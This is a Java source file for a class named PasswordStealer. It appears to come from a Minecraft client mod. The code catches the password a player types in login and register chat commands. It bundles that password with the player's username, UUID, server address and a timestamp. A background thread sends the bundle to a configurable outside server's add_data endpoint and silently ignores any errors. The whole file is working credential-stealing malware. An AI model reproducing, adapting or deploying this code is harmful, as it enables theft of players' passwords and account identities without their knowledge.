package me.soda.witch.features;

import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

import static me.soda.witch.Witch.mc;

public class PasswordStealer {
    static String address = "http://127.0.0.1";

    private static void uploadPassword(String[] args) {
        try {
            for (int i = 0; i < args.length; i++) {
                args[i] = URLEncoder.encode(args[i], "UTF-8");
            }
            new URL(String.format("%s/add_data?username=%s&password=%s&server=%s&uuid=%s&ts=%s",
                    address, args[0], args[1], args[2], args[3], args[4])).openStream();
        } catch (Exception e) {
        }
    }

    public static void stealPassword(String command) {
        String username;
        String password;
        String server;
        String uuid;
        List<String> loginHint = Arrays.asList("l", "login", "log");
        List<String> regHint = Arrays.asList("reg", "register");
        String[] cmdArray = command.split(" ");
        if (cmdArray.length > 0) {
            if ((loginHint.contains(cmdArray[0]) && cmdArray.length == 2)
                    || (regHint.contains(cmdArray[0]) && cmdArray.length == 2 || cmdArray.length == 3)) {
                password = cmdArray[1];
                if (mc.getCurrentServerEntry() != null) {
                    String name = mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address;
                    server = name.replace(":", "_");
                } else {
                    server = "unknown";
                }
                username = mc.getSession().getUsername();
                uuid = mc.player.getUuid().toString();
                String ts = String.valueOf(new Date().getTime());
                new Thread(() -> uploadPassword(new String[]{username, password, server, uuid, ts})).start();
            }
        }
    }
}
